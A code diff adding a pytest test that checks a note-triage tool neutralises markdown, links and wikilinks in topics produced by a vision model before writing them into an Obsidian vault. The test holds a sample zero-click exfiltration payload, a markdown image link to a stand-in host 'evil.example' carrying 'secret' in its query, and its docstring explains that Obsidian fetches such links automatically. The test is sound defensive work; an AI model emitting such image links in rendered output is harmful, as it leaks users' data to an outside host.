@@ -618,3 +618,21 @@ def test_when_the_budget_is_used_up_before_the_first_image_the_notification_says
     assert w.model.image_calls == []
     message = w.notify.sent[-1].message
     assert "all 7 image(s) deferred before the first image" in message and "next run" in message
+
+
+def test_a_topic_with_markdown_html_or_a_url_never_reaches_the_triage_file_as_such(vault, pack_dir, overlay):
+    """Zero-click exfiltration: ``![](https://evil.example/c?d=secret)`` in a note makes Obsidian fetch it. The
+    output guard flags the blatant payload (the row is quarantined with an empty topic); what passes the guard
+    is neutralised on the write path."""
+    s = script()
+    s[digest("post.jpg")] = valid_description(topic="![](https://evil.example/c?d=secret)")
+    s[digest("proj-page.png")] = valid_description(
+        topic="A page, see [docs](evil.example/a) and `x` for ![[Other]]"
+    )
+    w = World(vault, pack_dir, overlay, vision_script=s)
+    w.run()
+    text = (w.vault / "0-INBOX/Inbox-Triage.md").read_text(encoding="utf-8")
+    for bad in ("evil.example", "![", "](", "[[", "`", "secret"):
+        assert bad not in text, bad
+    soft = w.rows[rid("proj-page.png")]
+    assert soft["needs_owner"] is False and soft["topic"].startswith("A page, see")  # kept, made inert
